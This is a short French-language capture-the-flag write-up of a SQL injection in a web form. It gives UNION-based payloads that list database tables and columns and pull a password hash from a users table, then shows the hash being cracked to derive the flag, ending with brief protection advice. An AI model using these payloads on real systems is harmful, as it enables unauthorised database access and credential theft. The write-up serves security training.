# Vulnérabilité: Injection SQL

## Découverte

En testant le formulaire, nous avons constaté qu'une erreur SQL s'affiche lorsqu'on entre des caractères spéciaux, indiquant que les entrées sont directement insérées dans les requêtes sans validation.

### Exploitation
Nous avons utilisé plusieurs requêtes UNION pour extraire des informations:

1. Identifier les tables:
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables --
```

2. Identifier les colonnes:
```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 --
```

3. Extraction des données sensibles:
```sql
1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --
```

### Résultat
Nous avons obtenu:
- First name: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
- Surname: `5ff9d0165b4f92b14994e5c685cdce28`

Le hash MD5 `5ff9d0165b4f92b14994e5c685cdce28` correspond à `FortyTwo`.
En suivant les instructions, nous avons converti `fortytwo` en minuscules puis appliqué SHA256 pour obtenir le flag.

## Protection
- Implémenter une validation des entrées côté serveur
- Filtrer les caractères spéciaux SQL
